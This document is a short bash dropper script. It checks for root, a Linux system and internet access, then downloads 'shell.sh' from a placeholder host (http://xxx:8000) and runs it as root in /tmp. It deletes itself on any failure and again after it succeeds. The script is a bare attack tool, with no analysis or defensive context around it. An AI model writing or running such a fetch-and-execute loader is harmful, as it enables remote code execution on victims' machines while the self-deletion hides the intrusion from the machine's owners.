#!/bin/bash

# Self-destruct if not running as root
if [ "$(id -u)" -ne 0 ]; then
    echo "Error: This script must be run as root"
    rm -- "$0"
    exit 1
fi

# Check for compatible Linux system (basic check for /etc/os-release)
if [ ! -f /etc/os-release ]; then
    echo "Error: Not a compatible Linux system (missing /etc/os-release)"
    rm -- "$0"
    exit 1
fi

# Check for internet connectivity (try to connect to a reliable server)
if ! curl -Is http://www.google.com >/dev/null 2>&1; then
    echo "Error: No internet connection detected"
    rm -- "$0"
    exit 1
fi

# Download and execute the file
TARGET_URL="http://xxx:8000/shell.sh"
OUTPUT_FILE="/tmp/shell.sh"

if curl -fsSL "$TARGET_URL" -o "$OUTPUT_FILE"; then
    chmod +x "$OUTPUT_FILE"
    "$OUTPUT_FILE"
else
    echo "Error: Failed to download the file"
    rm -- "$0"
    exit 1
fi

# Self-destruct after successful execution
rm -- "$0"
